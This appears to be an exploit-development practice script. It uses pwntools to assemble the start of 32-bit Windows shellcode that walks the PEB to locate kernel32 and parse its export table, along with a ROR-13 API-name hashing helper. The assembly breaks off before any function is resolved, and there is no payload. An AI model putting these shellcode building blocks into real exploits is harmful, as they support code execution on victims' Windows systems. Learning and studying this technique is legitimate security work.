#!/usr/bin/env python3

import numpy as np
from pwn import *


def ror(byte, count):
    binstr = np.base_repr(byte, 2).zfill(32)

    for _ in range(count):
        binstr = binstr[-1] + binstr[0:-1]

    return int(binstr, 2)


def compute_hash(func_name):
    func_hash = 0
    ror_count = 0

    for byte in func_name:
        func_hash += byte
        if ror_count < len(func_name) - 1:
            func_hash = ror(func_hash, 0xd)
        ror_count += 1

    return hex(func_hash)


shellcode = asm('''
start:
    mov ebp, esp
    sub sp, 0x60

find_kernel32:
    xor ecx, ecx
    mov esi, fs:[ecx+0x30]  # _TEB.ProcessEnvironmentBlock
    mov esi, [esi+0x0c]     # _PEB.Ldr
    mov esi, [esi+0x1c]     # _PEB_LDR_DATA.InInitializationOrderModuleList
check_module:
    mov ebx, [esi+0x08]     # _LDR_DATA_TABLE_ENTRY.DllBase
    mov edi, [esi+0x20]     # _LDR_DATA_TABLE_ENTRY.DllName
    mov esi, [esi]
    cmp [edi+0x18], cx
    jne check_module

find_function:
    mov eax, [ebx+0x3c]
    mov edi, [ebx+eax+0x78]
    add edi, ebx 
    mov ecx, [edi+0x18]  # _IMAGE_EXPORT_DIRECTORY.NumberOfNames
    mov eax, [edi+0x20]  # _IMAGE_EXPORT_DIRECTORY.AddressOfNames
    add eax, ebx
find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov esi, [eax+ecx*4]
    add esi, ebx
find_function_finished:
''')

print(f'{disasm(shellcode)}')
print(f'shellcode = {shellcode}')

